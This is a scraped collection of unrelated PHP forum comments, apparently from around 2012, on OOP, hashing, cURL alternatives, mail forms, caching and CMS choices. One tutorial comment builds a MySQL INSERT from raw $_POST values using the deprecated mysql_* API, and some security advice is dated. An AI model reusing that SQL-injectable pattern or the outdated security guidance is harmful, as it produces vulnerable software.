http 1.1 requires it to be absolute, and your arguments for not being standards compliant can be fixed by using a function call, so I wouldn't consider it a valid reason to avoid being standards compliant. If you were solving a real problem, perhaps, but you're solving a theoretical problem that doesn't really exist in practice.
nope, it's protocol relative so in https context this script is loaded via https protocol, otherwise it isn't.
TIL that this works. That's pretty awesome.
Is this why sites such as banks or FASFA require 3 credentials to login(password, pin, and ssn?)
Blindly including JS hosted on another website is dangerous.
In which case, there's nothing stopping you from just making your own local copy of http://js.sopablackout.org/sopablackout.js . 
PHP is loosely typed (at best). Creating your object properties ensures that they are present and documented. It makes it easier for your IDE to flag errors if you mistype a variable name, and it ensures that everyone is on the same page. All classes which extend your class will all contain the properties defined by the parent. Using an undefined property does not throw any errors or exceptions other than normal. (Accessing it while undefined will leave a warning, but if you set it, it exists.)
You could declare the properties in the parent class and use magic getters/setters to access them. That way you could be sure the children have these declared.
I don't think its utterly useless, and I don't think reddit does either. http://news.ycombinator.com/item?id=46406
Two wrongs don't make a right. Now go away.
If you ever decide to use the __set() and __get() access magic functions you can declare what to do if a property is not found when calling it from an object. http://php.net/manual/en/language.oop5.overloading.php. I find niether of these functions elegant nor close to the definiton of OOP but it gets the job done.
From a security standpoint, do you want two way encryption of certain data? Or would it not really matter?
&gt; I thought not defining a class property and then using it in the class hierarchy would throw an exception, much like declaring an abstract method and then not defining it in a child class. You can throw an exception inside the __get() magic method to enforce property declarations. Any undeclared properties will trigger that exception. I do this with most classes to detect typos early and often. &gt; I want to enforce that all these child classes must have the same set of properties but declaring them in the abstract parent class doesn't seem to enforce their existence in its child classes in any way. If you declare them in the parent class, they'll exist in the child class. In other words, they'll already be defined in the child before the child's constructor even runs. I don't know what else you would want here. 
If you're already writing in PHP, I find it semi comical to use it to simply/conditionally include a piece of javascript (which many browsers can ignore or "not see" (eg. [NoScript](http://noscript.net/), [Request Policy](https://www.requestpolicy.com/) and a few others).
ok cool. ive never checked into either of those so ill check them out. thanks!
Yes but all properties have different values in the child classes so I want to enforce that I define them when I construct the child classes.
You can't declare the same (public/protected) property in a parent class and again in a child class. You declared it in the parent class and now you just set the new value of that property in the constructor of the child. (This is pretty much how all object-oriented languages work). Setting the default value in the declaration is just a short cut. 
Have the parent constructor take all the values as parameters (or as an array) like so: protected $_my_var1; protected $_my_var2; protected $_my_var3; public function __construct($myvar1, $myvar2, $myvar3) { $this-&gt;_my_var1 = $myvar1; $this-&gt;_my_var2 = $myvar2; $this-&gt;_my_var3 = $myvar3; } And in the child class call the parent constructor: public function __construct() { parent::__construct('a value', 'another', 5); } You can put whatever checks you want in the parent class constructor. Depending on what you're doing, you might even be able to make the parent properties `private` rather than `protected`. 
That's a very interesting solution, thank you for that. If this was stackoverflow I would give you the 'tick' :)
The domain should be banned from /r/php in my humble opinion.
I was on the fence, until this. You are correct, and also probably a very nice person.
Not only that they're working on moving their libs to php5, pear2.php.net and https://github.com/pear2/ I'm sure they wouldn't mind somebody porting this library.
Very true. I like to look at how other people solved the same problem as me. Sometimes you'll find neat tricks you didn't think of. Or you can bask in your own glory thinking thank god I didn't have to use php4 to write this in. Either way it's an opportunity to learn.
For passwords there is no need for two way encryption. Good hashes shouldn't have collisions(where two words produce the same hash). If the hashed password is the same as the hashed password in the database then you're good to go. Another algorithm that has been getting noticed lately is bcrypt. There is a decent blog post about it here: http://codahale.com/how-to-safely-store-a-password/. I feel there are a couple inaccuracies in the blog but for the most it's reasonable. The issue with sha1/256(md5 and des are already out of the question) is that one could rent a super computer cluster to store a library of all complete hashes. Bcrypt is slower than sha, and there for is currently computationally impossible to brute force. 
Here's a better one: &lt;?php if(date("Y-m-d") === '2012-01-18') die("THANKS PIPA"); ?&gt;
You honestly wouldn't force the use of certain properties in child classes. Off the top of my head, I can't even think of any programming language that allows that. This is what getters/setters are for. Instead of trying to force child classes to have a property name $age, you would instead make the abstract methods getAge() and setAge(). Example: abstract class FooBar { public abstract function getAge(); public abstract function setAge($age); } This forces the child class to have those methods. I can only assume you have some method in the abstract parent class that relies on the existence of a property, and relies on that property having a value. Example: abstract class FooBar { public function displayAge() { echo $this-&gt;age; } } And of course that would fall apart if $this-&gt;age didn't exist in the child class, or wasn't set to a value. That's where the getter comes in. Your method would be written like this: abstract class FooBar { public function displayAge() { echo $this-&gt;getAge(); } } The important thing here is the child class gets to handle the "age" value in whatever way it wants, which is good, because it's not the responsibility of the parent class to force the child class to do things in a certain way.
Don't forget that you should send the 503 (temporarily unavailable) header not to affect your SEO, e.g. header('HTTP/1.1 503 Service Temporarily Unavailable'); header('Retry-After: Thu, 19 Jan 2012 00:00:00 GMT');
Yes that's how I have it set up now. It just seems to me it might sometimes be useful to force properties like an abstract method forces a method to be defined. I just wanted to know more about how this all works and I can say now that I do :)
Could swear the title said... &gt; Whats a good Open Source cat? Anyone else or just me?
In short: nope. They want you to integrate with them, not the other way round.
Yeah, relative paths are awesome, I've been using them for years. I just didn't realize you could do it across domains.
I dunno about you, but I like some fruit in my loops. ;) (sorry, just couldn't resist)
is that an object?
In the case of this gist, it doesn't affect what GoogleBot sees, as it just places an overlay onto the page, and it allows your visitors to click-to-continue. (it then simply removes the overlay... But GoogleBot just sees the same thing it normally would.) Maybe if you looked at the http://sopablackout.org you'd get a better idea of what I mean. It's pretty slick and easy.
I see nothing wrong with loops in loops. You would be making it very hard for yourself if you avoided them. 
You mean you like writing code that can't adjust from your dev environment to your production environment without someone going in and manually changing it. You're not solving anything.
No, I mean I like writing code that doesn't need to be adjusted.
Well per your previous example, I'm glad to see you running your production environment on localhost:8888. This conversation is over with.
Lol'd in the office
Today there are so many different database engines, so not all database engines should be avoided in a loop. noSQL databases, memory databases could be queried in a loop (but still if it is possible to avoid it.. do it)
They still represent a large bottleneck, doing it once is better than doing it several times.
Don't put unreset counters. You never know who has used $i before you.
The only stuff that should go in the loop is the stuff that actually has to happen multiple times. Think carefully about the logic of your program and consider whether some things really only need to be done once. Take them out of the loop.
It's fine if that's what you really need, but often more than 2 nested loops is a sign of bad coding.
I feel like this post ended a bit suddenly, I searched the page for a few seconds trying to find the "Next" button. Where's the other attacks?
"The first is rather simple: never, ever use GET for any critical task. Instead, use a POST form." that doesnt stop CSFR.
It doesn't matter what language you are currently coding in. It doesn't matter what syntactical construct you are using. It doesn't matter what design book you just ate. It doesn't matter what framework is flavor of the month. The answer is **always** this. &gt;“Perfection is achieved, not when there is nothing more to add, but when there is nothing left to take away”. &gt; &gt;Antoine de Saint-Exupery
&gt;you can do shit to make it "weird" for anyone trying to get in. Don't ever rely on that.
Great. I'm working on something now and just trimmed several queries out of a couple loops. Very pleased with the results. Thank you.
This is the worst question ever
Not really a PHP question is it?
Overall, I like it. Found a bug, though: When you click a menu item (Documentation/Community/Help), then click again to close it, the original intro/download info is nowhere to be found.
OO Python is 2x faster than PHP .... really?!
Can we update the subreddit design to match? At least get rid of that god-awful purple logo. It's always been an eyesore :S
I have been in his shoes before though. I really dislike Typo3 and finding answers on the internet can be tedious to say the least...
I'd say the current design is fairly modern, like mid 00's. But the banner of photos in this prototype makes it look like a 1998 design...
I like some things, I hate some things...
It's definitely way better than the old design but still not exactly great is it?..
I can agree with this... do it when the new website goes live. Keep the purple until then. Even if it is a weird color scheme, at least it will match the main php.net website.
Caching saves you heaps of trouble, use css sprites to cut down the amount of requests. Do anything else to cut down requests! If you have database interaction optimize your database and your queries. Can some pages be static? And for how long? Generating these pages on moments when the load is low can relieve the strain on the server during peak moments. If you serve static files, serve them from a server which can only serve static files. They are faster. Optimize your script to use less ram, there is usually a trade off between ram and speed (more ram -&gt; faster and the other way around), optimize this for your server.
* I simply do not like the absurd prominence they give to other companies / organziations they want to thank. It is good to be thankful, but that should be its own page with just a link on main page. Too many external links adds clutter to the main page, and gives the whole website that generic 'SEO optimized' wordpress spamblog feel. Ugh. * I also wish the new design would do something to make finding changelogs easier (not just for release, but any and all beta and RCs too). Other than the download links, I need the changelogs more than anything else. You know, just to find out if something will break if I compile and install a newer version, or to satisfy my curiosity about what has changed / improved. Unfortunately the new design seems to be no better than the last one in these two department. It's an improvement overall.
Not sure if it is accurate to call this a proxy.. There is a super-ugly part in the javascript where it assumes it only takes 3 seconds after each link is submitted to be cached.. It should be hinged to the wget request but I'm not quite sure how to do that.
You don't want to use wget! I do this thing already with redditmirror... Use httrack coupled with pecl_gearman... I also got really deep with RedditMirror and httrack's spidering functionality no longer cut it for me, so I made my own DOM crawler and use *that* to get images, css, js, flash, etc.
Link to your app source? I don't see any downloads or ways to use http://www.redditmirror.cc/ .. is that it?
FYI, *paid.
...no shit.
Why the fuck are you running a debugger/profiler on a production server?!
&gt;I don't think he is. Thank goodness. &gt;He's just pointing out that in testing/benchmarking, xdebug can make your application seem slower than it really is. Sounds to me like the OP is using Xdebug in the wrong way, i.e. to micro-optimize, rather than using it to identify a real performance issue.
I agree about the font size. 13px not only makes it hard on the eyes, it makes it look very 2003 as well.
I don't like the image strip. It has no place to be there, it's just distracting
Does anyone know if Textmagic is the best bang for your buck? This isn't just about price, I'm asking about the features it has, the coverage it allows, and the use of the API.
[Submit a Bug](http://bugs.php.net)
I've actually updated a couple of things lately that have made the design less ugly. [ajmint](/user/ajmint) was so kind as to contribute a logo, and I changed the PHP logo to use the transparent PNG version, so that it's not blocky. If you do have some suggestions, I'd be happy to consider them. But, I don't think we'll even try to match the prototype design, as it's subject to change.
Much more profressional. Welcome to the 21st century PHP.net. I just hope they don't mess w/ the layout of their documentation as many people are so used to it.
So a car isn't new, even if you bought it off the showroom floor, because it was actually designed at least a year or 2 earlier?
In other news, it's 2012.
You need to show us the whole code chunk, we can't tell you anything from one line.
sorry. i did it
Which is exactly why I said that the OP is using xdebug in the wrong way. It should be activated and used to identify what the problem is once you actually know that there *is* a problem. 
If you are planing to use this on live server, I suggest you to study php mailer. 
Great. You should var_dump $subject to make sure it's actually being set by the form in the first place, otherwise this looks fine. I should mention, however, that without some good checks for potential-evil, this would be very easy to abuse by any spammer or malicious individual who came across it. You should at least be verifying that they're not trying to put any email headers in any user-submitted data at the very least!
For Future Generations: The above script is shit. Also, look at Amazon SES. the built in mail() function is shit.
Im def in the group of "Great! Finally"
Months? Try years. There was an effort in 2008 which never made it very far. The "current" effort started in early 2010, and hasn't changed much since then. The last time the redesign repository was touched was a little over a year ago, and it's still very incomplete. Seems abandoned to me.
How does anything show up in IE6 now days?
my boss is very hyped about tropo.
or SwiftMailer, or better yet, Zend Mail
Well, it's open source, so it of course happens as people have time. You're welcome to [help out](https://wiki.php.net/web#web_redesign_2009201020112012).
http://media.tumblr.com/tumblr_lxq3lqhLcu1r0skbn.png
A late entry: As you print the table, if the value is the highest you've seen yet, apply the class "highest" to that cell. Then you can use CSS .highest:last to style it.
Please do not post linkjacked links such as these. Instead, link to the source, which is [this article](http://www.udemy.com/blog/modern-language-wars/). This provides credit and traffic to the author. Feel free to re-post the original article, but this one will unfortunately remain removed.
That's really clever actually. Thanks
It depends on if you want the extra services they offer. You can easily send single or bulk texts via the carriers' email service. Some examples: * AT&amp;T: phonenumber@txt.att.net * T-Mobile: phonenumber@tmomail.net * Sprint: phonenumber@messaging.sprintpcs.com * Verizon: phonenumber@vtext.com 
This is good if you know your users carriers, but they send the messages as MMS messages and I know at least for iPhones, they are formatted very strangely.
The name sounds familiar, I'll have to look into it.
I'm using Xdebug for years now and this article is useless. This is not why and how you use Xdebug. What does it matter if Xdebug inflates the script runtime. And if someone compares a script run with Xdebug with one that ran without it, he is a moron.
Someone should tell the PHP devs this. Seriously. Teaching noobs the wrong way because it's less effort is a fool's business.
I also recommend [Killersites](http://www.killersites.com/), their video tutorials are really good! I also recommend [Webdev Refinery](http://webdevrefinery.com/) (their php -&gt; tutorial subforum) and [Nettuts](http://net.tutsplus.com/).
For OAuth 1.0a integrations, use the the oauth-php library you've linked to. The thing that may be tripping you up is that oauth-php is both an OAuth client and a token storage system. If you don't want to create the database tables for token storage, you should use Session storage. Ping me on twitter @jakemcgraw and I'll send you some example code.
A script on the page is checking the DOM to see if it's the top most parent. If it's not, it knows it's in a frame. I do this on a page that is supposed to be displayed in a frame and not by itself. If it isn't, it redirects to the main page.
This. Also, the article title is the most horrible cliché-ridden POS I've ever seen.
Javascript? var iframed = (window != top);
Ahh, I didn't notice the @mms and @txt. I've only known of @txt. I'm aware you can just ask the user, but with these API's it seems that it covers most carriers out there, so for 1 cent to 10 cents per text, for an application they are paying for, is a trivial cost to pay for a more user friendly experience.
Probably not the MOST useful, but I could definitely see myself using a couple of these over the next year or so.
What about keeping the main site and the shopping site separate (ie: shop.boniggy.com), but implementing a single-signon between them for authentication? SSO gives you a seamless site-&gt;shop experience for the user and it'd let you leave the shop system mostly untouched other than the authentication piece.
Ok, not really an answer to your question, but... What are you trying to do? Chances are there's a better way to do it.
I'm encountering the problem while working on [NOMY](http://github.com/ambiversive/nomy), what is essentially a web front end for wget combined with an iframe for browsing the cached files.
Love it.
All these too-clever-by-half bitwise people are working with single-byte character encodings?
1) Sessions are pretty darn secure, in the grand scheme of things. They can be hijacked, but since all the useful info is stored on the server, data can't be pulled back out like it can in a cookie. 2) It's not really any more complicated to use unique_id if you've written your wrappers well. Just abstract it until it's simple.
That solution is too awesome.
I've never understood sessions better. Thank you.
It's all good. It's a good discussion topic, I just think you might get a better response in that subreddit. Good luck!
Wouldnt xoring two potentially long strings have a very horrible worst case compared to both the simpler and the probably much faster iterative comparison? Overengineering ftw.
TIL PHP will XOR strings
Additional overhead? Do you realize that `strlen()` calls you need to make just to loop are likely going to be more expensive than the memory copy and xor (for reasonably small strings)? As far as *need for additional overhead*, it's a time/memory tradeoff. The XOR solution trades off an additional copy of the string for the benefit of the comparison done using processor opcodes directly (the xor is handled by compiled C). For strings of reasonably small size (less than 1kb), the worst case for the XOR solution is still FAR better than the average case for the loop... Sure, the loop may be better in the best case scenario for it (which is incidentally the worst-case scenario for XOR), but in the average case, the XOR will always blow away the loop... That's because with the xor the limiting factor is memory allocation (note, a single allocation). With the loop, it's the fact that PHP needs to constantly iterate (which is no where near as efficient as a loop in C). In fact, I ran the benchmark from my comment above on my local machine with a 100kb string in the middle character different state. The XOR took 0.5 seconds to do 1000 iterations of the check, but the loop took over 60 seconds to do the same check. And that's for the middle character being different...
This is a break out from iframe function that reliably works wherever the parent window is. try { if (window.parent.frames.length &gt; 0) { if (window.parent.document.body.innerHTML) { //same domain goes here window.parent.location = location; } } } catch (err) { //different domain goes here window.parent.location = location; }
God damn! XOR it is, nice job.
I haven't thoroughly looked at your code, but I get the impression you are trying to submit a form using javascript when somebody clicks on a link. Here's an easy way of doing it. Stick this in between your head tags &lt;script&gt; function submitForm(){ formElement = document.getElementById('theForm'); formElement.submit(); } &lt;/script&gt; in your opening form tag add id='theForm' so your form tag will look like this: &lt;form name="theForm" id="theForm" action="contact.php" method="post"&gt; Change your submit link to look like this: &lt;a onclick="submitForm()" href="#"&gt;Submit&lt;/a&gt; That should do the trick. 
Thanks, I had almost responded to the earlier comment but I see you've changed it. I've been working on this small snippet of code since yesterday morning and I am pretty sure I tried what you asked me to do. BUT because I'm an idiot, I tried it again, maybe I got something wrong the first time. I did not. That didn't work. I KNOW the PHP code is wrong, just not enough experience in pinpointing out what the problem is.
You are checking if the POST variable 'Submit' is set ( isset($_POST['submit']) ) but the 'Submit' variable will never be set as you aren't POSTing a Submit variable in the form.
Basically &gt; &lt;!-- &lt;input type="submit" value="Send"&gt; &gt; &lt;input type="reset" value="Clear"&gt; --&gt; Isnt being posted anymore so your check in php for the submit value of "send" (EDIT: Not true, it never existed due to no name in the submit) no longer exists. Just add: &lt;input type="hidden" name="submit" value="1"&gt; to your html and it will work. 
Oh, another thing to learn early on: form arrays. &lt;form method="POST"&gt; &lt;input type="text" name="theForm[address]"&gt; &lt;input type="text" name="theForm[subject]"&gt; &lt;input type="submit"&gt; &lt;/form&gt; Makes $_POST["theForm"] = array("address"=&gt;"value", "subject"=&gt;"value");
Or better yet, just add the JavaScript function to the click event of the submit button so it will fall back to the standard usage if JavaScript is disabled. Although, the end result will be identical since they are both just triggering the form action. 
#1. your php is checking for a field in the form named "submit" Obviously, there is no field named submit in your form. Change the $_POST['submit'] to the name of a field that is being passed and is mandatory such as $_POST['email'] #2. If this is really all the code, you're much better off just using the natural submit button. #3. Get firebug for debugging javascript. It will be your bestest friend in the world when you get used to using it. Edit: #4. For self-debugging, put a print_r($_POST) above or after the code. This way you can see exactly what $_POST is sending.
See [filter](http://php.net/filter) with [FILTER_SANITIZE_URL](http://php.net/manual/en/filter.constants.php)
I lol'd.
I ... I ... I ... You .. did, how is it, when did .. ugh butts butts butts butts butts butts This totally worked.
Do you understand why it's working now? If not i'll be more than happy to explain in greater detail. =]
Okay, so here's what's going on in the HTML: &lt;form id="theForm" action="contact.php" method="post"&gt; E-mail&lt;br&gt;&lt;input type="text" name="email"&gt;&lt;br&gt; Subject&lt;br&gt;&lt;input type="text" name="subject"&gt;&lt;br&gt; Comments&lt;br&gt;&lt;textarea name="comments"&gt;&lt;/textarea&gt;&lt;br&gt; &lt;a href="#" onclick="javascript:document.getElementById('theForm').submit();"&gt;Submit&lt;/a&gt; &lt;/form&gt; &lt;form&gt; submits the form data to contact.php using the POST method. The two lines you commented out &lt;!-- --&gt; don't get submitted. The &lt;a&gt; tag isn't really supposed to point to anything so we use the # to stay on the same page - what it's doing is appending a hash anchor to the URL which would normally point to a section of the page #someSection.. etc. But for this we just use it to keep the link from doing anything. It would have worked with the javascript in the href but I try not to do that, it feels dirty, instead I use onclick. The javascript inside the onclick just selects the form element by searching for it's id attribute, and once it finds it it calls the submit() function submitting your form. Once the form is submitted these things are sent to your PHP script: $_POST['email'] = ... $_POST['subject'] = ... $_POST['comments'] = ... See how they use the input fields of the form? After commenting out the field with the name of 'submitted' in the HTML side, it never gets sent to php, so this: if(is_set($_POST['submitted'])){ is false and the code inside the block does not run, instead everything after }else{ will run. Because "submitted" no longer exists I removed it and all of its helper bits (like }, {, }else{ }; etc). Without this the script has no idea what to do if you call it up without sending it any form data, so you did have the right idea by making sure the form had been submitted, but it's a bit complicated for a beginner project. So, the script now expects there to always be form data and your problems are solved! I added one little thing to make sure that you got some kind of message though, $var = mail(...); sends the email and if the email gets sent, it sets $var to true, if it fails it sets $var to false if($var){ echo 'it worked'; }else{ echo 'it failed'; } simply prints a message depending on what mail(...) set $var to. Also there's no shame in sharing code, we all started out using snippets and after a few years we start using libraries - which are just giant snippets. haha
You could, but probably wouldn't want to do it that way. What exactly are you trying to achieve?
There are even mistakes in the simplest snippet "Check if server is HTTPS". Some servers don't set HTTPS if it's not on and that snippet will give you an 'undefined index error'. You can find a much better code snippet on [stack overflow](http://stackoverflow.com/questions/4911532/undefined-index-error-using-serverhttps).
Another way to do this is to have permissions set to allow or deny. So the Administrator would have something similar to '+ ALL', and the Ban type would have '- ALL'. In this case it would merge what both mean, and when a conflict occurs where one allows and another denies a permission, it would default to denying it.
Do you need to stop using curl or just stop dealing with it directly? Depending on what you're doing you might be able to get away with using [Zend_Http_Client](http://framework.zend.com/manual/en/zend.http.client.html). It is a lot cleaner and the default adapter doesn't require curl.
I recently seen a cool library I forget what it was called though, GAS or Fuel, or something? It basically makes doing the things curl does way easier and more elegant. I'll post back when I find the link unless someone else knows it?
Glancing through this it looks like it is dependent on curl.
Have you tried file_get_contents and stuck a URL in it? Works on some hosting plans, but not all.
yes, but until told why curl is being ruled out, I'm with compubob. I honestly can't think why you can't use it, other than some homework assignment where it was called out directly.
&gt; HTTP_Request PEAR library; you could use system() to call a command-line tool such as "/usr/bin/wget" or "/usr/bin/GET"; or you could use plain old TCP sockets From google, you can find numerous answers. I'm not sure anyone will help you rewrite the code. Do you simply, not have libcurl enabled on your php host? There's too much configuration assumed in this code (ini_set every time, what's the php.ini look like?).
Works on all hosts where you would stay. If it doesn't, switch, because the host doesn't know what it's doing.
You already have you answer but I just want to say watch your swears... It's awkward when they make it to production... :D
Are you sure you don't want to use cURL? I use cURL all the time to access 3rd party API's and from my experience cURL is a winner. I used to use file_get_contents to access 3rd party data but after getting complaints from my VPS hosting provider for my resource use I went and unit tested my scripts and realized that file_get_contents was utilizing an insane amount of memory to access basic files across the web. I switched all my scripts over to cURL and I'd estimate they use 1/20th the resources. cURL is tried tested and true.
Looking at the code it looks like this is something that can run on different hosts, and his concern is that some shared hosts might have curl disabled.
This is a really bad practice and a host where it doesn't work is actually looking out for you over one where it does. 
Could you please provide a reference for this? (btw a recent one, things were different in ancient version of PHP where there was no allow_url_include.)
I'm guessing you don't actually want OB then, or at least as PHP defines it. In general, with PHP you end up doing a lot of string concatenation and using the file functions for that sort of stuff. Output buffering was traditionally only done to shave a few milliseconds off of performance by printing to a buffer and then dumping it to the browser, but with the advent of APC, caching, and other modern technology, it's relatively unnecessary. Unless i misunderstood your initial question?
PHP is perfectly fine for this. If you have many accounts, it's mostly network/transfer that takes a lot of time so the language is not a problem. Is there a bigger issue than just the fact that it takes long to run? That's just normal if you're getting a lot of content.
Consider breaking it up and sending each request for information seperately to a job server like [Gearman](http://gearman.org/). [Here's a short introduction](http://e-mats.org/2011/08/a-gentle-introduction-to-gearman-and-its-concepts/).
Gearman really is what you want here. One script to push lots of jobs into the queue, and then have a boat load of "workers" standing by to fetch and process the jobs in a never ending loop. Got more customers? Start more workers.
aww, I missed it. What was said before they deleted?
Thanks! I'll look into it. Right now, I just have one big massive batch...didn't know something like this existed. Thanks!
He said cURL was awful and file_get_contents + fopen were better (or something along those lines)
If it takes too long to fetch them all in one go, then try not fetching them all in one go. Just do a few at a time and tick them off as you go along, or do as many as you can, and keep running the batch process until they are all ticked off.
This seems to be the advice I'm getting here. Thanks, that's what I'll do then! Some people have suggested libraries (gearman) that can do this for me...hopefully it works!
running a script command line will also help avoid any timeout issues you'll want a cron that restarts the script if it's not running though
Now I"m starting to regret getting windows hosting :( ...I guess there must be a cron equivalent on this side too
No, don't use curl - you'd just be adding another open pipe to the stack where you don't need one. The Gearman suggestion above is far better.
I'm still curious why he doesn't want to use curl. I can't think of a solid reason why someone would exclude its usage. Sounds to me like a misguided idea on how to solve a problem. That said, PHP's [HTTP Stream Context](http://php.net/manual/en/context.http.php) is a decent alternative but still doesn't approach curl in terms of flexibility and power.
&gt; Now I"m starting to regret getting windows hosting :( Well, at least you've learned a valuable lesson.
for emacs you have [TrampMode](http://www.emacswiki.org/emacs/TrampMode).
Never used it myself but I know a few people that like [Textpad.](http://www.textpad.com/) Not sure if it has the functionality that you're looking for but it's a start.
[Sublime](http://www.sublimetext.com/2) it takes all the features of textmate and adds a super nice streamlined UI on top of it, and it runs on Windows, Mac, and Linux.
Seems like it would be nice to give author of N++ a [heads up](http://notepad-plus-plus.org/contributors/author.html).
+1, I switched months ago and haven't looked back. One caveat is that it is paid software, although you can use it without buying a license (it'll pop up a notice occasionally, but it's not too annoying).
The command used to be "AT" on windows server 2000/2003. 
I can not use curl because my hosting provider's server does not have it installed. He is a friend of mine and due to him not being comfortable in recompiling PHP with cURL along with other reasons. I wont switch hosting providers because he is a friend and I dont have the money right now to afford anything else. But, because he is a friend, we are in close contact. We have tried all libcurland packages and the php5-curl package and neither has worked. Meaning the script still returns the error that the curl_init function can not be found. So, I am starting on giving up to finding a solution for a script that uses cURL to work on this server without recompiling PHP with cURL. What I am trying to.accomplish is a search engine that searches my site or a site in PHP. It also prints where (+ surrounding text) in the site it found the searchedbwork in a list. It also records the number of results and the length of the search in seconds. If someone could help me get this script to not use cURL or write a script to do what I am trying to accomplish, I would be extremely grateful and appreciative.
Well with the trouble cURL has given me, I would believe so. I explained some more in the top comment.
Its a long story, but I tried to explain it in my reply to the top comment. I also wrote what I am trying to accomplish there too. Do you think HTTP Stream context could do that or help in achieving it?
PHP into a template? What PHP, what template?
Nope , I asked not to use it.
Yes that is part of it— that the server it is on, my server space, doesn't have cURL.
Yes, thanks. I tried w3schools earlier. It's still a little complicated for me. I don't know where I am physically supposed to put the commands for accessing the information and running the query. I'm not sure if I should put something under each line of the test or something at the end of the entire test or run something from inside myphpadmin. 
Okay. Thanks. That looks like exceptionally fun freetime reading:)
No I have nit. Its there a way I can check. And do you gave any links to good articles And documentation on how ti use it?
Ah okay. Well it doesn't look like I can use cURL.
Yes that it. Thank you explaining it. I just knew it worked(that small part of the script at least(
Do you mind helping me do this? I have no clue on where to start. I apologise for being a noob, but I will try ny best to learn and understand. I wrote what my goal is in my reply to the top comment.
A shiver goes down my spine whenever people advice that they read W3 Schools and call it a good place for learning. It isn't. I think the reason most people link to it is because they believe that they're affiliated with the W3C, which is not the case.
Well, assuming the online test is being filled out in a form, you will need to add an `action` to the form so that it knows what to do when the user clicks "Submit". Additionally, you will need to provide a `method` to transfer the data contained in the form to the actionable item (`get` transfers the information in the URL, `post` is more incognito). To keep it simple, use an index.php page for the test and then a results.php page to process. So, the opening form tag will be as follows: form action="results.php" method="post" (Wrap that in &lt; and &gt;, I couldn't figure out how to escape it properly to show). So, this code will tell the form to submit the information to the results.php page using the POST method. Next, the results.php page will handle the collection and insertion of the data into the table. First, we need to collect the data from the form. To do so, we'll use the global variable $_POST which is an array holding all the form data. If we had an text input named `question1`, then we can retrieve it as follows: $question1Answer = $_POST['question1']; Once you have gathered all your answers (we'll leave out validation for the moment, but if you would like to know more I can touch on that too) then you need to insert them into the table. Before you can insert anything, however, you need to connect to the database server. Thankfully, PHP has a function to do just that: [`mysql_connect`](http://php.net/manual/en/function.mysql-connect.php). To implement it you need to check that you are able to connect; we will store this status in the `$dbConnection` variable. $dbConnection = mysql_connect('server', 'dbUser', 'dbPassword'); // To ensure we successfully connected: if ($dbConnection == false) { exit("No connection made"); } Of course, there is arguably a better structure you can use involving [`try`](http://php.net/manual/en/language.exceptions.php) but for brevity we'll use exit for now. With the connection established, you need to select the specific database containing your table. Once again, PHP has a function to handle the brunt of the work: [`mysql_select_db`](http://php.net/manual/en/function.mysql-select-db.php). It is implemented as so (once again, we check to see if the selection was successful): $dbSelection = mysql_select_db('dbName', $dbConnection); if ($dbSelection == false) { exit("Could not select DB"); } Now, we will need to insert your answers into the table for which we will utilize SQL in conjunction with the [`mysql_query`](http://php.net/manual/en/function.mysql-query.php) function. SQL Insert statements are structured as follows: INSERT INTO `tableName` (`column1`, `column2`) VALUES ('value1', 'value2'); Assuming an incredibly simplistic table structure of one column, named "Answers" with a `type` of `text`, contained within the table "Quiz", your SQL insert statement will look like so: INSERT INTO `Quiz` (`Answers`) VALUES ('$question1Answer'); (*Aside*: Ideally you would have a second column named "Question" set to auto-increment to match the "Answers" value to its respective question number.) The SQL statement is useless without a way to send it to the database, so we will use the `mysql_query` function mentioned earlier: // Store the SQL statement in a variable $insertStatement = "INSERT INTO `Quiz` (`Answers`) VALUES ('$question1Answer');"; // Pass said variable, containing the statement, to the database server $insertQuery = mysql_query($insertStatement); // Check to see if it was successful if ($insertQuery == false) { exit("Could not insert answer"); } Assuming you are checking the answers for accuracy manually, you are now done! Please feel free to ask for any clarifications. If anyone notices any errors or knows of a quicker way, please point that out too!
Since your already familiar with Codeigniter, I would try [PyroCMS](http://www.pyrocms.com/) its built on top of CI and has lots of add-ons and a good community and documentation.
There are [Drupal modules](http://drupal.org/search/apachesolr_multisitesearch/vbulletin?filters=ss_meta_type%3Amodule) that can either integrate or migrate with vBulletin. All the rest should be pretty straightforward in Drupal.
Be sure to escape any external output before you insert it into a query. `$question1Answer = mysql_real_escape_string($_POST['question1']);`
Yeah, if the community is the central focus of your site, Drupal is where it's at. They've worked out a really robust system for users with different permissions, so it's easy to customize and extend around that core with Drupal modules.
Edit your index.php / default.php and add the HTML from your home page. EDIT: Looks like you got BOTH index.php and index.html, just stick with one index file.
Since any solution will be a defacto work-around, a relatively simple solution would be to use wget (a binary program for making web requests). Most of the code will be simple to change, if we have access to the binary from say... exec('/usr/bin/wget'); The elephant in the room here is that ANY workaround for curl will require more knowledge and a hell of a lot more programming and testing than recompiling with curl (or enabling it in the ini and restarting apache, if it's on apache) 
SilverStripe. New version coming out soon. Check it out.
You're right about not storing files/images in the database, always store them in the file system. As you mentioned you're going to use ImageMagick to do some processing so why not pass the images (via their name, or some other identifier) to a script that does your processing but also include some logic to check the user is allowed to view that image.
One thing I do to automatically sanitize what's in $_POST is this : $data = array_map('mysql_real_escape_string', $_POST); Then I use $data in my queries. It's also possible to put it inside extract() and just use the resulting variable names if you don't want to type $data everytime haha. It's still better to use PDO though.
I didn't know posting from another site to tumblr is possible, is it really?
Yes itll work for loading page content. Read the documentation I linked to for how to use it. All that said, you still are probably going about search indexing in a sub optimal manner. I'd look into using something like sphinx or lucene for searching.
[Symphony CMS](http://symphony-cms.com) - it's the only CMS that I haven't been horrified with after working with it a few weeks.
OH GOD WHY. Somebody please educate this poor soul. As much as I would love to show this person the light, I have four minutes 'til I have to be back at work.
The use of the `mysql` extension is highly discouraged by Zend. It is provided only for backwards compatibility. Use `mysqli` or better yet, `PDO`.
I really like that the templates exist as files on the filesystem with ExpressionEngine. That allows template changes to be tracked in your version control system.
I've heard nothing but good things about EE. I'd love to try it myself at some point.
Adding to this, there isn't a built-in forum module yet, but integrating the user login system of vbulletin wouldn't be too hard (Elefant has its own as well as OpenID, Facebook, Google, and Twitter already) and I could help or point you in the right direction :)
Thanks. This is the clearest explanation I've seen. Do you have a response to the security concern that appointment_1_am raised?
 Not familiar with those modules, but I can't recommend Drupal highly enough. Its module system is great for keeping different projects completely separate from each other.
He's not actually kidding, it's a feature.
Upvote for Pyro. My GF runs a fairly large arts website and I want to move her away from WP to Pyro so badly. 
And you're ok hosting with this guy? Sometimes the best thing you could do for a friend is to point out when it might be a good idea to stop digging the whole they're in. PS: When you installed php5-curl did you verify that the module was added to the config file AND restart php?
